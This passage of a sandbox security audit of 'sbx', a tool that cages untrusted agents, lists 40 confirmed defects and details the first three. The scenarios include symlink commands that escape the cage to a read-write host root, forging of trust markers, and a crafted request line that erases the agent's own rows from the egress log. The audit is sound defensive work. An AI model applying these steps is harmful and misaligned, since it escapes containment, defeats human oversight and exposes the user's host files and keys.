# Audit de sécurité — findings confirmés

Dix-huit sous-systèmes à risque ont été audités séparément, puis chaque défaut relevé a été
soumis à un vérificateur indépendant chargé de le **réfuter**. Seuls les défauts ayant survécu
à cette réfutation figurent ci-dessous ; les défauts réfutés ont été écartés et ceux dont la
vérification n'a pas pu être menée à son terme sont isolés dans `annexe-non-verifie.md`.

**Total : 40 défauts confirmés** (1 critique, 5 élevée, 11 moyenne, 23 faible).

## Table des matières

| # | Gravité | Emplacement | Défaut |
|---|---|---|---|
| [S1](#s1-home-mountpoint-pins-bind-sources-cage-writable-home-subdirectories-so-a-symlink-the-cage-leaves-behind-mounts-an-arbitrary-host-directory-read-write-into-the-next-cage) | Critique | `src/sandbox/binds.rs:739` | `home_mountpoint_pins` bind-sources cage-writable $HOME subdirectories, so a symlink the cage leaves behind mounts an arbitrary host directory read-write into the next cage |
| [S2](#s2-a-not-yet-created-control-plane-root-under-a-symlinked-path-produces-no-pin-so-the-cage-can-plant-a-trust-marker-or-an-engine-binary) | Élevée | `src/config/load.rs:290` | A not-yet-created control-plane root under a symlinked path produces no pin, so the cage can plant a trust marker or an engine binary |
| [S3](#s3-a-cage-erases-its-own-refused-egress-requests-from-sbx-net-log-with-one-control-byte-in-the-request-target) | Élevée | `src/sandbox/control/mod.rs:1404` | A cage erases its own refused egress requests from `sbx net log` with one control byte in the request target |
| [S4](#s4-execcontent-enforcement-shim-is-installed-after-preambles-that-run-cage-rewritable-store-binaries) | Élevée | `src/sandbox/launch.rs:3980` | Exec/content enforcement shim is installed after preambles that run cage-rewritable store binaries |
| [S5](#s5-trust-marker-is-keyed-on-the-symlink-resolved-config-path-so-a-symlinked-sbxtoml-inherits-another-projects-trust-verdict) | Élevée | `src/trust.rs:189` | Trust marker is keyed on the symlink-resolved config path, so a symlinked `.sbx.toml` inherits another project's trust verdict |
| [S6](#s6-exec-targets-are-matched-as-the-raw-unresolved-path-string-so-relative-spellings-walk-through-a-path-glob-allow-or-deny-rule) | Élevée | `src/proc_policy.rs:113` | Exec targets are matched as the raw, unresolved path string, so `..`/`//`/relative spellings walk through a path-glob allow or deny rule |
| [S7](#s7-fs-watchadd-tree-follows-a-symlink-when-installing-a-watch-letting-the-cage-push-the-inotify-watch-set-outside-the-project-and-blind-the-observation-lens) | Moyenne | `src/sandbox/fs_watch.rs:235` | `fs_watch::add_tree` follows a symlink when installing a watch, letting the cage push the inotify watch set outside the project and blind the observation lens |
| [S8](#s8-broker-spawns-a-plugin-sandbox-and-dials-the-host-resource-before-the-cage-sends-its-first-frame-with-no-churn-limit) | Moyenne | `src/sandbox/broker.rs:1268` | Broker spawns a plugin sandbox and dials the host resource before the cage sends its first frame, with no churn limit |
| [S9](#s9-union-allow-opt-silently-discards-the-higher-tiers-ssh-agent-confirm-breaking-the-documented-confirm-can-never-be-turned-off-by-another-layer-rule) | Moyenne | `src/config/overrides.rs:709` | `union_allow_opt` silently discards the higher tier's `[ssh_agent] confirm`, breaking the documented "confirm can never be turned off by another layer" rule |
| [S10](#s10-the-app-profile-consent-report-renders-attacker-controlled-profile-strings-to-the-terminal-unsanitised) | Moyenne | `src/config/load.rs:747` | The app-profile consent report renders attacker-controlled profile strings to the terminal unsanitised |
| [S11](#s11-a-task-invocations-plaintext-credential-memfd-stays-open-for-the-whole-run-so-a-concurrently-spawned-sibling-cage-inherits-it) | Moyenne | `src/sandbox/task.rs:1154` | A task invocation's plaintext-credential memfd stays open for the whole run, so a concurrently spawned sibling cage inherits it |
| [S12](#s12-notify-relay-forwards-the-cages-app-name-and-app-icon-verbatim-so-the-workload-can-forge-sbxs-own-blocked-allow-it-sbx-net-allow-toast) | Moyenne | `src/sandbox/notify_relay.rs:232` | Notify relay forwards the cage's app_name and app_icon verbatim, so the workload can forge sbx's own "Blocked: … · allow it: sbx net allow …" toast |
| [S13](#s13-storespublish-silently-overwrites-a-catalogue-entry-when-two-plugins-in-one-store-declare-the-same-manifest-name) | Moyenne | `src/plugins/stores.rs:429` | `stores::publish` silently overwrites a catalogue entry when two plugins in one store declare the same manifest `name` |
| [S14](#s14-upstream-h2-client-leaves-server-push-enabled-and-uncapped-so-a-hostile-allowlisted-upstream-grows-host-memory-without-bound) | Moyenne | `src/sandbox/proxy/h2mitm.rs:998` | Upstream h2 client leaves server push enabled and uncapped, so a hostile allowlisted upstream grows host memory without bound |
| [S15](#s15-a-control-frame-with-a-declared-length-125-is-followed-not-rejected-14-bytes-turn-the-outbound-leak-tripwire-and-the-capture-off-for-the-rest-of-the-tunnel) | Moyenne | `src/sandbox/proxy/websocket.rs:751` | A control frame with a declared length > 125 is followed, not rejected: 14 bytes turn the outbound leak tripwire and the capture off for the rest of the tunnel |
| [S16](#s16-websocket-secret-block-does-not-stop-a-secret-in-the-frames-the-cage-pipelines-behind-its-handshake-they-are-written-into-the-upstream-before-they-are-scanned) | Moyenne | `src/sandbox/proxy/websocket.rs:1060` | `websocket_secret = block` does not stop a secret in the frames the cage pipelines behind its handshake — they are written into the upstream before they are scanned |
| [S17](#s17-a-transient-enoent-from-seccomp-ioctl-notif-recv-permanently-ends-exec-and-open-supervision-for-the-run) | Moyenne | `src/sandbox/proc_enforce.rs:862` | A transient `ENOENT` from `SECCOMP_IOCTL_NOTIF_RECV` permanently ends exec and open supervision for the run |
| [S18](#s18-explain-clear-reads-deny-rules-through-the-allow-side-ws-opt-in-so-every-cleartext-deny-loses-to-a-ws-allow) | Faible | `src/allowlist/mod.rs:1516` | explain_clear reads deny rules through the allow-side WS opt-in, so every cleartext deny loses to a `{WS}` allow |
| [S19](#s19-opens-every-host-tests-only-requesturl-so-a-catch-all-regex-that-matches-via-the-canonical-form-escapes-the-catch-all-label) | Faible | `src/allowlist/mod.rs:503` | opens_every_host tests only `Request::url`, so a catch-all regex that matches via the canonical form escapes the catch-all label |
| [S20](#s20-split-method-prefixs-doc-claims-a-prefix-less-entry-is-methodsany-the-code-returns-methodsunspecified-and-the-difference-is-what-default-methods-keys-on) | Faible | `src/allowlist/grammar.rs:136` | split_method_prefix's doc claims a prefix-less entry is `Methods::Any`; the code returns `Methods::Unspecified`, and the difference is what `default_methods` keys on |
| [S21](#s21-a-wildcard-fs-mask-entry-silently-skips-any-directory-entry-whose-filename-is-not-valid-utf-8-leaving-the-file-open-with-no-warning) | Faible | `src/sandbox/fsmask.rs:289` | A wildcard `[fs]` mask entry silently skips any directory entry whose filename is not valid UTF-8, leaving the file open with no warning |
| [S22](#s22-host-deadline-is-a-per-read-socket-timeout-not-a-per-exchange-budget-so-a-trickling-host-resource-wedges-a-broker-connection-indefinitely) | Faible | `src/sandbox/broker.rs:1278` | `host_deadline` is a per-read socket timeout, not a per-exchange budget, so a trickling host resource wedges a broker connection indefinitely |
| [S23](#s23-refusal-record-files-an-attempt-to-add-a-constrained-smartcard-key-type-26-as-an-attempt-to-remove-a-key-and-does-not-name-type-24) | Faible | `src/sandbox/sshagent.rs:584` | Refusal record files an attempt to add a constrained smartcard key (type 26) as an attempt to remove a key, and does not name type 24 |
| [S24](#s24-union-fs-opt-folds-scan-max-kb-with-min-the-exact-direction-fspolicyunion-documents-and-tests-as-the-one-that-widens) | Faible | `src/config/overrides.rs:685` | `union_fs_opt` folds `scan_max_kb` with `min`, the exact direction `fspolicy::union` documents and tests as the one that widens |
| [S25](#s25-scan-ambient-iterates-stdenvvars-which-panics-on-any-non-utf-8-environment-variable) | Faible | `src/config/overrides.rs:272` | `scan_ambient` iterates `std::env::vars()`, which panics on any non-UTF-8 environment variable |
| [S26](#s26-max-request-bytes-undercounts-by-up-to-3x-because-from-utf8-lossy-expands-each-invalid-byte-to-three) | Faible | `src/sandbox/task_control.rs:894` | `MAX_REQUEST_BYTES` undercounts by up to 3x because `from_utf8_lossy` expands each invalid byte to three |
| [S27](#s27-relay-rebroadcasts-every-host-actioninvokednotificationclosed-into-the-cage-including-notifications-the-cage-never-raised) | Faible | `src/sandbox/notify_relay.rs:372` | Relay rebroadcasts every host ActionInvoked/NotificationClosed into the cage, including notifications the cage never raised |
| [S28](#s28-gpu-true-binds-all-of-devdri-granting-primary-drm-nodes-where-the-module-header-promises-render-nodes) | Faible | `src/sandbox/gpu.rs:38` | gpu = true binds all of /dev/dri, granting primary DRM nodes where the module header promises render nodes |
| [S29](#s29-raw-cage-stdoutstderr-echoed-to-the-launching-terminal-during-sbx-upgrade) | Faible | `src/sandbox/launch.rs:1428` | Raw cage stdout/stderr echoed to the launching terminal during `sbx upgrade` |
| [S30](#s30-run-captured-buffers-unbounded-hostile-cage-output-in-the-host-side-supervisor) | Faible | `src/sandbox/launch.rs:5641` | `run_captured` buffers unbounded hostile cage output in the host-side supervisor |
| [S31](#s31-cage-scope-dirs-walks-every-users-slice-not-this-users-contrary-to-its-own-doc) | Faible | `src/sandbox/cgroup.rs:372` | `cage_scope_dirs` walks every user's slice, not this user's — contrary to its own doc |
| [S32](#s32-storesverify-key-reports-verified-without-ever-comparing-the-supplied-key-when-the-store-was-pinned-out-of-band) | Faible | `src/plugins/stores.rs:238` | `stores::verify_key` reports "verified" without ever comparing the supplied key when the store was pinned out of band |
| [S33](#s33-the-refusal-notifications-sbx-net-allow-fix-drops-the-port-and-the-scheme-contradicting-both-refusal-body-sites) | Faible | `src/sandbox/proxy/ctx.rs:482` | The refusal notification's `sbx net allow` fix drops the port and the scheme, contradicting both refusal-body sites |
| [S34](#s34-per-stream-authority-check-compares-only-the-host-subcomponent-so-a-userinfo-bearing-authority-passes-and-is-forwarded-verbatim) | Faible | `src/sandbox/proxy/h2mitm.rs:206` | Per-stream `:authority` check compares only the host subcomponent, so a userinfo-bearing authority passes and is forwarded verbatim |
| [S35](#s35-an-established-h2-tunnel-has-no-idle-bound-so-a-cage-can-pin-every-host-connection-thread-permanently) | Faible | `src/sandbox/proxy/h2mitm.rs:155` | An established h2 tunnel has no idle bound, so a cage can pin every host connection thread permanently |
| [S36](#s36-the-h2-plane-never-registers-a-live-flow-so-sbx-net-live-is-blind-to-every-grpc-tunnel) | Faible | `src/sandbox/proxy/h2mitm.rs:436` | The h2 plane never registers a live flow, so `sbx net live` is blind to every gRPC tunnel |
| [S37](#s37-the-private-address-exception-is-granted-to-the-always-on-built-in-allow-rules-which-ip-refusals-own-doc-says-must-never-get-it) | Faible | `src/sandbox/proxy/ssrf.rs:136` | The private-address exception is granted to the always-on built-in allow rules, which `ip_refusal`'s own doc says must never get it |
| [S38](#s38-on-the-https-forward-plane-the-ws-pseudo-verb-reaches-the-verdict-but-not-the-allow-outcome-the-log-or-the-stats) | Faible | `src/sandbox/proxy/forward.rs:340` | On the https-forward plane the `WS` pseudo-verb reaches the verdict but not the `allow` outcome, the log, or the stats |
| [S39](#s39-any-framingdecode-giveup-silently-switches-the-leak-tripwire-off-for-the-rest-of-the-tunnel-while-the-relay-keeps-forwarding) | Faible | `src/sandbox/proxy/websocket.rs:524` | Any framing/decode giveup silently switches the leak tripwire off for the rest of the tunnel while the relay keeps forwarding |
| [S40](#s40-the-o-nofollow-guard-in-serve-open-never-fires-o-patho-nofollow-succeeds-on-a-symlink) | Faible | `src/sandbox/proc_enforce.rs:1298` | The `O_NOFOLLOW` guard in `serve_open` never fires: `O_PATH\|O_NOFOLLOW` succeeds on a symlink |

## Détail

### S1 — `home_mountpoint_pins` bind-sources cage-writable $HOME subdirectories, so a symlink the cage leaves behind mounts an arbitrary host directory read-write into the next cage
| | |
|---|---|
| **Gravité** | Critique |
| **Emplacement** | `src/sandbox/binds.rs:739` |
| **Catégorie** | `sandbox-escape` |
| **Sous-système** | Binds, masques et politique de fichiers |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `home_mountpoint_pins` (binds.rs:724-743) emits, for every intermediate component of `APPLICATIONS_REL` (`.local/share/applications`) and `MIMEAPPS_REL` (`.config/mimeapps.list`), a read-write mount:

```rust
.map(|rel| Mount::Bind {
    src: home_src.join(&rel),
    dest: PathBuf::from(format!("{SANDBOX_HOME}/{}", rel.display())),
})
```

For those two rels the sources are `<home_src>/.local`, `<home_src>/.local/share` and `<home_src>/.config`. `home_src` is the persistent per-project/per-app home that `cage_mounts` binds read-write at `/home/sandbox` (binds.rs:597-600). Everything BELOW that mount point is an entry in-cage code owns and can replace, and it survives the cage — the home is reused on the next launch of the same project/app.

`Mount::Bind` becomes bwrap's `--bind` (argv.rs:188), i.e. `mount(src, dest, MS_BIND)`, and the kernel resolves the source path with LOOKUP_FOLLOW. Nothing between the cage's write and that mount checks the components: `build_spec`'s only preparation is `DirBuilder::new().recursive(true).mode(0o700).create(parent)?` (binds.rs:1589-1593), and `create_dir_all` is satisfied by a symlink resolving to a directory — the exact failure mode `cagedir` exists for ("`create_dir_all` cannot see that: it stats through a link, finds a directory, and reports the parents as made", cagedir.rs:9-11) and that `theme_relay::write_keyfile_confined` defends with an `O_NOFOLLOW` `openat` walk over these very same $HOME components (theme_relay.rs:216-231). `home_mountpoint_pins` uses neither `cagedir::ensure_under` nor an `O_NOFOLLOW` walk.

The doc comment asserts the property the code does not have: "The sources are the home's own subdirectories, which the caller has created (see `build_spec`)" (binds.rs:722). They are the home's own subdirectories only if the cage has not repointed them.

Control-plane pinning does not cover this: `control_plane_pins` (config/load.rs:379-408) fires only for a writable bind whose host path contains a control-plane root, and pins that root at its own host path; the escape surfaces at the unrelated in-cage path `/home/sandbox/.config`, which nothing pins.

**Scénario.** Precondition: the session declares `[open]` (a trusted field, and the normal configuration for a GUI app or an OAuth device-auth flow — exactly the sessions that run an untrusted agent that logs in). With no `[open]` handler `open_rels` is empty and no pin is emitted.

1. In launch N the agent runs inside the cage: `rm -rf ~/.config && ln -sfn / ~/.config`. $HOME is /home/sandbox, bound read-write from `home_src`, so this writes `home_src/.config` as a symlink to `/` on the host. The cage exits; the home is persistent.
2. In launch N+1 of the same project/app, `build_spec` runs `create_dir_all(home_src/.config)`; the path resolves through the link to `/`, which exists and is a directory, so it returns Ok (binds.rs:1589-1593).
3. `cage_mounts` calls `home_mountpoint_pins` (binds.rs:657), emitting `Mount::Bind { src: home_src/.config, dest: /home/sandbox/.config }`.
4. bwrap runs `--bind <home_src>/.config /home/sandbox/.config`. The kernel follows the symlink and bind-mounts the host root filesystem, READ-WRITE, at /home/sandbox/.config inside the cage.

The agent now has read-write access to the entire host: the user's ssh keys and browser profiles, sbx's own ~/.config/sbx global config, and ~/.local/state/sbx/trusted — writing the trust store promotes any project or plugin to trusted, unlocking `[[binds]]`, `[devices]` and seccomp relaxation on every subsequent launch. `ln -sfn /home/user/.local ~/.local` reaches the same trust store and every other project's persistent home through the `.local` pin, with a second read-write alias via the `.local/share` pin. The whole filesystem, bind, mask and credential-brokering policy is bypassed in one step, from a persisted symlink and with no race to win.

**Correction proposée.** Confine the pin sources the way every other cage-writable tree in this codebase is confined. In `build_spec`, replace the `DirBuilder::new().recursive(true)` loop at binds.rs:1585-1595 with `super::cagedir::ensure_under(&rt.home_src, <parent rel>, 0o700)?` for each rel, anchored on `rt.home_src` (the bind's mount point, the one component the cage cannot exchange), so a symlink or non-directory at `.local`, `.local/share` or `.config` is a hard launch error instead of something written through and then bound. Since `home_mountpoint_pins` is pure and cannot do I/O, have `build_spec` hand it the already-verified paths rather than letting it re-derive `home_src.join(rel)`, and correct the doc comment at binds.rs:721-723, which states the property as though it were enforced.

**Rectification du vérificateur.** Two corrections to the mechanism, neither of which saves the code.

(1) The `.local` / `.local/share` half of the attack is REFUTED. Every launch runs `miseplugin::register(rt.home_src, ".local/share/mise/plugins")` unconditionally with `?` (binds.rs:1612-1623, MISE_DATA_REL = ".local/share/mise" at binds.rs:1006), and `register` starts with `cagedir::ensure_under(root, rel, 0o700)` (miseplugin.rs:86), which `symlink_metadata`s every component below the anchor and returns a hard error for a non-directory (cagedir.rs:37-50). A `ln -sfn /home/user/.local ~/.local` left behind therefore aborts the next launch before any mount is assembled — build_spec runs at line 1621 and `cage_mounts` only later. So `.config` is the sole unguarded pin source, and the claimed "second read-write alias via the `.local/share` pin" does not exist.

(2) The stated one-session attack is self-contradictory and does not work. With `[open]` declared, `/home/sandbox/.config` is itself one of the pins, i.e. a mountpoint, so `rm -rf ~/.config` empties it but `rmdir` returns EBUSY and `ln -sfn / ~/.config` then fails EEXIST — that is precisely what the pins buy (test `every_component_of_an_open_destination_is_a_mountpoint`, binds.rs:2696). The attack needs an *unpinned* launch on the same persistent home first. The cage can arrange that on its own: trust is a SHA-256 of `.sbx.toml`'s bytes keyed by canonical path (trust.rs:1-21, verdict_for_hash trust.rs:220-247), the project is bound read-write at its own host path, and an untrusted/changed config only *warns* and drops `[open]` rather than failing the launch (`gate.refuse` -> `refuse_untrusted`, config/mod.rs:2126, 5032-5034, 5124-5129). So: launch N the agent rewrites `.sbx.toml` to delete `[open]`; launch N+1 is `Changed`, `[open]` is dropped, no pins are emitted, the agent does `rm -rf ~/.config && ln -sfn / ~/.config` and restores the original bytes verbatim; launch N+2 hashes as `Trusted` again, emits the pin, and bwrap binds host `/` read-write at /home/sandbox/.config. A shared `GlobalApp` home (binds.rs:1338-1341, keyed only by app name) gives the same window without any config edit: an unpinned launch in an untrusted project poisons the home a trusted project's pinned launch then binds. The one user-visible signal is a "changed since it was trusted" warning on one launch. Severity critical is retained; the fix should anchor on `rt.home_src` with `cagedir::ensure_under`, as the finding proposes.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Code confirmed. binds.rs:738-740 emits `Mount::Bind { src: home_src.join(&rel), ... }` for each intermediate component; argv.rs:187-191 turns `Mount::Bind` into bwrap `--bind`; binds.rs:1585-1595 prepares those sources with a plain `DirBuilder::new().recursive(true).mode(0o700).create(parent)?`, which is satisfied by a symlink resolving to a directory (the exact hazard cagedir.rs:9-11 exists for). No `cagedir::ensure_under` and no O_NOFOLLOW walk guards `.config`. The codebase's own model agrees that a symlinked bind source redirects the bind: binds.rs:1397-1403 says canonicalising the project path means "a later project-controlled symlink swap no longer trivially redirects the bind". The doc claim at binds.rs:721-723 ("The sources are the home's own subdirectories, which the caller has created") is therefore an unenforced assertion. I could not find any guard on the `.config` component, so the finding stands.

</details>

---

### S2 — A not-yet-created control-plane root under a symlinked path produces no pin, so the cage can plant a trust marker or an engine binary
| | |
|---|---|
| **Gravité** | Élevée |
| **Emplacement** | `src/config/load.rs:290` |
| **Catégorie** | `sandbox-escape` |
| **Sous-système** | Configuration et secrets |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `sbx_control_plane_roots` builds the three roots (data dir, trust store, global-config dir) as raw paths and canonicalises them best-effort: `.map(|r| r.canonicalize().unwrap_or(r))`. `Path::canonicalize` fails unless the WHOLE path exists, so a root that has not been created yet keeps its unresolved form — which the comment on line 287 acknowledges ("A root that does not exist yet keeps its raw form") without noticing it re-opens the hazard the two lines above name ("the roots must be [canonicalized] too, or a symlinked `$HOME` component would let a bind slip past the guard").

Both consumers then fail. `control_plane_mode` (lines 320/333) compares a canonicalised bind against the raw root: neither `canon.starts_with(root)` nor `root.starts_with(canon)` holds, so the bind stays read-write with no warning. `control_plane_pins_for` (line 385) filters on the same `r.starts_with(&bind.path)` and emits NO pin for that root. That defeats the mechanism `sandbox/launch.rs:3283-3287` says exists for exactly this case: "create each pin's host path (they are sbx's own directories — creating a not-yet-existent root here is what stops the agent pre-creating it unpinned)", and the containment test `launch.rs:3269-3273` says is canonicalised precisely so "a symlinked `$HOME` component would otherwise walk straight past" it.

Neither `trust::default_store_dir()` (trust.rs:156, pure path math) nor `store::Layout::from_env()` creates its directory, so a missing root is the normal state before the first `sbx trust` / first launch. trust.rs:188-198 already implements the correct technique (canonicalise the parent, re-append the tail).

**Scénario.** Alice's `$HOME` is `/home/alice`, a symlink to `/mnt/data/alice` (separate data volume, or `/home -> /export/home`). She has never run `sbx trust`, so `~/.local/state/sbx/trusted` does not exist. She runs `cd ~ && sbx run` — `pin_sources` (launch.rs:3274) pushes the canonicalised project `/mnt/data/alice` as a writable pin source and the project root is bound read-write structurally. `sbx_control_plane_roots` yields the raw `/home/alice/.local/state/sbx/trusted`, which does not `starts_with("/mnt/data/alice")`, so `control_plane_pins_for` returns nothing for it, `establish_control_plane_pins` never creates or freezes it, and `control_plane_mode` prints no warning. The hostile agent in the cage writes `/mnt/data/alice/.local/state/sbx/trusted/<key>` holding `content_hash` of a `.sbx.toml` it also writes into a project directory. On the next `sbx run` there, `read_project` reads that marker through `/home/alice/...` (same inode) and returns `TrustState::Trusted`, so that project's `[seccomp]`, `[devices]`, `[binds] mode="rw"`, `[network]`, `[secret]` and `[task]` all apply — the trust gate is fully bypassed. The same hole over the data dir lets the agent pre-create `<data>/engines/...`, whose contents sbx `execve`s host-side.

**Correction proposée.** Resolve each root the way `trust::canonical_string` does: canonicalise the longest existing ancestor and re-append the missing components, so a not-yet-created root is expressed in the same symlink-resolved namespace the binds are compared in. Replace `r.canonicalize().unwrap_or(r)` with a walk up to the first ancestor that canonicalises, joining the remaining tail onto it, falling back to the raw path only if even `/` fails.

**Rectification du vérificateur.** Mechanism confirmed, but narrow the preconditions and the strength of the two halves. It needs all of: (a) a symlinked component in the env-derived root path (e.g. /home -> /export/home, or $HOME on a separate dataset) — nothing the cage controls, it is a property of the host; (b) the root not existing at pin time; (c) a launch whose read-write project root or config bind is an ancestor of that root (`cd ~ && sbx run`, or `--bind $HOME:rw`). The trust-store half is the strong one: that directory is created only by the `sbx trust` write path, so "missing" is the default state indefinitely. The data-dir half is much weaker than stated — any prior sbx run leaves `<data>` on disk, after which it canonicalizes and is pinned normally, so pre-creating `<data>/engines/...` is only reachable on a genuinely first-ever run. Also note `trust::canonical_string` (src/trust.rs:188-198) resolves only ONE missing trailing component (parent + file_name), so it is a model for the fix rather than a drop-in for a root whose whole tail is missing.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every cited line is real and says what is claimed. src/config/load.rs:290 is `.map(|r| r.canonicalize().unwrap_or(r))`, and the comment at 285-287 explicitly reads "the roots must be [canonicalized] too, or a symlinked `$HOME` component would let a bind slip past the guard. A root that does not exist yet keeps its raw form". Both consumers compare with `starts_with` on that possibly-unresolved value: load.rs:320 (`canon.starts_with(r)`), load.rs:333 (`r.starts_with(canon)`) and load.rs:385 (`r.starts_with(&bind.path)`). The other side IS canonicalized — sandbox/launch.rs:3277 `std::fs::canonicalize(project).unwrap_or_else(...)`, with the test `the_project_root_is_canonicalized_before_it_is_pinned_against` (launch.rs:6706-6721) pinning that — so with a symlinked `$HOME` the two sides are expressed in different namespaces and the containment test silently yields nothing. I looked for the guard on every side and found none: `trust::default_store_dir` (src/trust.rs:156-177) is pure path math over `$HOME`/`XDG_STATE_HOME` and creates nothing; `Layout::from_env` (src/store.rs:63-135) only resolves and checks, it does not mkdir; the store dir is created only on the write path (`trust_inner`, src/trust.rs:~325 "Create the store owner-only from the start"), so a user who has never run `sbx trust` has no such directory, and `read_project` (src/config/load.rs:542-547) only reads. The pin that would have created it read-only (launch.rs:3283-3298 `establish_control_plane_pins`) is never emitted for that root, and `control_plane_mode` prints no warning either. The forged-marker escalation also holds: the marker is an unauthenticated two-line file (`verdict_for_hash`, src/trust.rs:216-246 — plain `read_to_string`, no ownership/permission gate) keyed by `sha256(canonical path)` with a plain unsalted `content_hash` (src/trust.rs:113-124), all of which in-cage code can compute for a path it is bound at.

</details>

---

### S3 — A cage erases its own refused egress requests from `sbx net log` with one control byte in the request target
| | |
|---|---|
| **Gravité** | Élevée |
| **Emplacement** | `src/sandbox/control/mod.rs:1404` |
| **Catégorie** | `audit-evasion` |
| **Sous-système** | Plan de contrôle et tâches déclarées |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `LogRing::push` sanitises the three cage-chosen fields with `super::sanitize` (control/mod.rs:711-714), which is `observe_feed::sanitize` — it maps every control character to a **space** (observe_feed.rs:116). `format_event_line` then emits `method=` (mod.rs:1400-1402), `host=` (1403) and `path=` (1404-1406) as whitespace-delimited `key=value` tokens, and the reader `parse_event_line` (control/client.rs:373) does `for token in tokens { let (key, value) = token.split_once('=')?; ... }` at client.rs:391-392 — the `?` returns `None` for the **entire event**, so one token without an `=` deletes the whole row.

A space in `path` or `method` therefore erases the line rather than forging one. And the cage can put one there: the comment at mod.rs:692-707 itself states that the two fail-closed refusals in `handle_client` log "the raw method and target of a request line ... *before* `head_carries_control_byte` has run at all". Those two sites are proxy/mod.rs:394-403 (`method-not-allowed`, pushing `Some(method.as_str()), Some(target.as_str())`) and proxy/mod.rs:410-418 (`bad-request` on a malformed CONNECT authority, same). `request_line_parts` (proxy/wire.rs:237-246) splits the request line on SP only, so HTAB, NUL, VT, bare CR and every other C0 byte survive into `target` and `method`.

This is a known bug class in this tree: `proc_control::head_token` (proc_control.rs:79) exists for precisely it, and its doc says "one holding a space but no `=` made `split_once` return `None`, which fails the whole parse and *erases* the event. `observe_feed::sanitize` does not close either: it maps control characters to **spaces**". `task_control::head_field` (task_control.rs:385) is the second copy. The egress log — the widest audit surface of the three — never got it. The existing test `a_log_event_carries_no_byte_the_cage_could_frame_or_paint_with` (mod.rs:2116) even asserts the sanitised values contain spaces (`"GET  X: forged"`, `"/a pending id=1"`) and stops at the ring; nothing round-trips them through `format_event_line` → `parse_event_line`.

**Scénario.** The in-cage agent sends, to the proxy socket bound at `/tmp/sbx-egress.sock` (or via the loopback forwarder on 127.0.0.1:18043): `printf 'GET /probe\tX HTTP/1.1\r\n\r\n'`. `parse_head` accepts it (a tab is not a line break and the head is valid UTF-8), `request_line_parts` yields method `GET`, target `/probe\tX`; the method is not CONNECT and the target is neither `http://` nor `https://`, so proxy/mod.rs:394 pushes a `blocked` / `method-not-allowed` event with `path = "/probe\tX"`. `LogRing::push` stores it as `/probe X`. The wire line becomes `event seq=1 at=… port=0 verdict=blocked proto=- reason=method-not-allowed method=GET host= path=/probe X`. `parse_event_line` hits the trailing token `X`, finds no `=`, and returns `None`. Every reader is downstream of that one parser — `sbx net log`/`net logs` (cli/net.rs:1381,1611), the merged `sbx logs` feed (cli/logs.rs:343), and `--json` — so the refusal appears nowhere. Repeating the probe with a `CONNECT host\tname HTTP/1.1` variant covers the second refusal site. The agent can now scan hosts, ports and endpoints while its `blocked` rows are invisible; `sbx net stats` still counts them (its host goes through `Tally::bump`, which sanitises separately), so the operator sees a counter that disagrees with an empty log and reads it as an sbx bug rather than as evasion.

**Correction proposée.** Apply the head-token treatment the sibling lenses already use. In `format_event_line`, wrap the head-position fields — `ev.method` (mod.rs:1401) and `ev.host` (mod.rs:1403) — in a `head_field`-style map that replaces `char::is_whitespace()` and `'='` with `'_'`, and either emit `path` past a marker read verbatim (the shape `lens::read_event_line` uses) or give it the same treatment. Harden the reader too, so an older plane is still read honestly: change `let (key, value) = token.split_once('=')?;` at client.rs:392 to skip a token that carries no `=` instead of failing the whole line. Add a round-trip test that pushes a method/path carrying a control byte and asserts `parse_event_line(format_event_line(&ev))` yields the event.

**Rectification du vérificateur.** Mechanism confirmed, but the auditor UNDERSTATED it and misdescribed the payoff. (a) The attack narrative — 'the agent can now scan hosts, ports and endpoints' — is wrong for the two cited sites: proxy/mod.rs:392 (`method-not-allowed`) and :410 (`bad-request` on a malformed CONNECT authority) both refuse before any connection is attempted, so nothing is learned by erasing them. (b) The far stronger vector is an ALLOW row on the tunneled plane. `head_carries_control_byte` (wire.rs:100) deliberately permits HTAB (`b != b'\t'`), and wire.rs:220-222 documents that `request_line_parts` splits on SP only precisely because U+00A0, U+2000‥200A, U+3000 and HTAB are ordinary request-target bytes. So a tunneled inner request `GET /x\tY HTTP/1.1` survives `parse_head`, `request_line_parts`, the origin-form check (tunnel.rs:145) and `inspect_framing`, and is logged as an allow through `ctx.outcome(..., Some(&imethod), Some(&itarget), StatKind::Allow, ...)` at src/sandbox/proxy/tunnel.rs:522-532 → ctx.rs:451-454 → LogRing::push. Sanitise turns the HTAB into a space and `parse_event_line` deletes the entire row. A U+00A0 in the target does the same without any sanitisation at all, since `split_whitespace()` splits on Unicode White_Space while `sanitize` only touches control characters. The consequence is therefore not 'hidden scan refusals' but 'a successful, allowed, credential-bearing egress request that leaves no row in `sbx net log`' — while `Tally::bump` still counts it, so `sbx net stats` and the log disagree. The suggested fix is right; the reader hardening at client.rs:392 (skip a token with no `=` rather than failing the line) is the part that also repairs an already-persisted plane.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Traced end to end and every link holds. `LogRing::push` sanitises with `super::sanitize` (src/sandbox/control/mod.rs:711-714), which is `observe_feed::sanitize` (re-exported at src/sandbox/mod.rs:153) and maps every `char::is_control()` to a SPACE (src/sandbox/observe_feed.rs:112-117). `format_event_line` emits ` method={method}` (mod.rs:1401), ` host={}` (mod.rs:1403) and ` path={path}` (mod.rs:1405) as whitespace-delimited tokens. The reader splits on `split_whitespace()` and does `let (key, value) = token.split_once('=')?;` at src/sandbox/control/client.rs:392 — the `?` aborts the WHOLE event, and the caller at client.rs:188 silently drops a line that fails to parse (it falls through to `parse_sighting_line`/`parse_capture_line`, both of which also return None, and then nothing). Reachability confirmed: `request_line_parts` splits on ASCII SP only (src/sandbox/proxy/wire.rs:237-246), and `head_carries_control_byte` is not run until `inspect_framing` (wire.rs:139), well after the two refusal sites at src/sandbox/proxy/mod.rs:392-399 and 410-418 which push `Some(method.as_str()), Some(target.as_str())` raw. `ProxyCtx::push_log`/`push_log_maybe_muted` (src/sandbox/proxy/ctx.rs:507-556) applies only `redact_query`, no whitespace scrubbing. No round-trip test covers a whitespace-bearing method/path (client.rs:760-850 only exercises `POST` / `/v1/x?a=1&b=2`), and the ring test at mod.rs:2116 asserts the sanitised values contain spaces and stops there. Nothing refutes it.

</details>

---

### S4 — Exec/content enforcement shim is installed after preambles that run cage-rewritable store binaries
| | |
|---|---|
